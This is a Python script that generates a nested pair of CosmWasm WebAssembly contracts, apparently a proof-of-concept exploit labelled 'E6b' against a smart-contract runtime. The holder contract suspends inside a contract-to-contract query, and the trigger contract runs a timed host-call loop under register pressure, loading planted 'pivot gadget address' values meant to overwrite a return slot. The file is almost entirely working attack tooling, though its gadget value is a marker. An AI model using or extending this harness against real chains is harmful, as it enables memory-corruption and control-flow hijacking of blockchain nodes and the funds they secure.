#!/usr/bin/env python3
"""Generate the E6b nested CosmWasm contract pair (holder + trigger).

holder.wat  : CosmWasm ABI; `execute` stages i64 locals then calls the `query` host import
              (contract-to-contract Smart query) -> suspends while the trigger runs on the
              stack above; resumes through the overwritten return slot.
trigger.wat : CosmWasm ABI; `query` runs the sparse drift loop (E4/E5 shape). Live values are
              loaded from planted qwords (data segment) = pivot gadget address + chain markers.

Usage: python3 gen_nested_contracts.py <outdir> [offset]
       (call schedule: call db_read when (i + offset) & 511 == 0; iters = 65536 + r + 1
        is baked in as a constant chosen by the caller via --iters)
"""
import argparse
import os
import struct

RESP = b'{"ok":{"messages":[],"data":null,"attributes":[],"events":[]}}'
TRIGGER_ADDR = "archway1triggertriggertriggertriggertrggxq5"
LIVE = 16
GADGET = 0x0042424242424242  # marker: if a planted slot lands on the return slot -> fault here


def region(offset, capacity, length):
    return struct.pack("<III", offset, capacity, length)


def esc(b):
    return "".join("\\%02x" % x for x in b)


ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
  (func (export "allocate") (param $size i32) (result i32)
    (local $data i32) (local $region i32)
    (local.set $data (global.get $heap))
    (global.set $heap
      (i32.and (i32.add (i32.add (local.get $data) (local.get $size)) (i32.const 7)) (i32.const -8)))
    (local.set $region (global.get $heap))
    (global.set $heap (i32.add (global.get $heap) (i32.const 16)))
    (i32.store (local.get $region) (local.get $data))
    (i32.store offset=4 (local.get $region) (local.get $size))
    (i32.store offset=8 (local.get $region) (i32.const 0))
    (local.get $region))
  (func (export "deallocate") (param $ptr i32))
  (func (export "interface_version_8"))"""


def gen_holder(outdir):
    req = ('{"smart":{"contract_addr":"%s","msg":"e30="}}' % TRIGGER_ADDR).encode()
    lines = [
        ";; E6b holder contract (generated).",
        "(module",
        '  (import "env" "query" (func $query (param i32) (result i32)))',
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        "  ;; @16 query-request region -> @64 request JSON; @32 response region -> @512 JSON",
        f'  (data (i32.const 16) "{esc(region(64, 256, len(req)))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        f'  (data (i32.const 64) "{esc(req)}")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "execute") (param $env i32) (param $info i32) (param $msg i32) (result i32)',
        "    (local $a i64) (local $b i64) (local $c i64) (local $d i64)",
        "    ;; stage distinctive values in locals (live across the query call)",
        "    (local.set $a (i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x1111)))",
        "    (local.set $b (i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x2222)))",
        "    (local.set $c (i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x3333)))",
        "    (local.set $d (i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x4444)))",
        "    ;; suspend inside the querier while the trigger runs on the stack above",
        "    (call $query (i32.const 16))",
        "    drop",
        "    (i64.add (i64.add (local.get $a) (local.get $b)) (i64.add (local.get $c) (local.get $d)))",
        "    drop",
        "    (i32.const 32))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "holder.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p, f"({len(req)}-byte request)")


def gen_trigger(outdir, offset, iters):
    vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
    lines = [
        ";; E6b trigger contract (generated).",
        f";; call when (i + {offset}) & 511 == 0; loop {iters} iterations",
        "(module",
        '  (import "env" "db_read" (func $db_read (param i32) (result i32)))',
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        "  ;; @16 key region -> @48 one key byte; @32 response region -> @512 JSON",
        f'  (data (i32.const 16) "{esc(region(48, 1, 1))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        '  (data (i32.const 48) "\\00")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        f'  (data (i32.const 64) "{esc(vals)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "query") (param $env i32) (param $msg i32) (result i32)',
        "    (local $i i32)",
        "    (block $exit",
        "      (loop $l",
        "        ;; 16 live values loaded from the planted qwords (register pressure)",
    ]
    for k in range(LIVE):
        lines.append(f"        (i64.load (i32.const {64 + 8 * k}))")
    lines += [
        "        (i32.load (i32.const 0))",
        "        (if (result i64)",
        "          (then (i64.add (i64.extend_i32_u (local.get $i)) (i64.const 0x12345678)))",
        "          (else (i64.extend_i32_u (local.get $i))))",
        "        drop",
        f"        (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511)))",
        "        (if (then (call $db_read (i32.const 16)) drop))",
        "        " + " ".join(["drop"] * LIVE),
        "        (local.set $i (i32.add (local.get $i) (i32.const 1)))",
        f"        (br_if $l (i32.lt_u (local.get $i) (i32.const {iters})))",
        "      )",
        "    )",
        "    (i32.const 32))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "trigger.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p, f"(offset={offset}, iters={iters})")


def gen_benign(outdir):
    lines = [
        ";; E6b benign trigger (warm-up only): one host call, returns immediately.",
        "(module",
        '  (import "env" "db_read" (func $db_read (param i32) (result i32)))',
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        f'  (data (i32.const 16) "{esc(region(48, 1, 1))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        '  (data (i32.const 48) "\\00")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "query") (param $env i32) (param $msg i32) (result i32)',
        "    (call $db_read (i32.const 16))",
        "    drop",
        "    (i32.const 32))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "benign.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("outdir")
    ap.add_argument("--offset", type=int, default=256)
    ap.add_argument("--iters", type=int, default=65793)
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    gen_holder(args.outdir)
    gen_trigger(args.outdir, args.offset, args.iters)
    gen_benign(args.outdir)


if __name__ == "__main__":
    main()
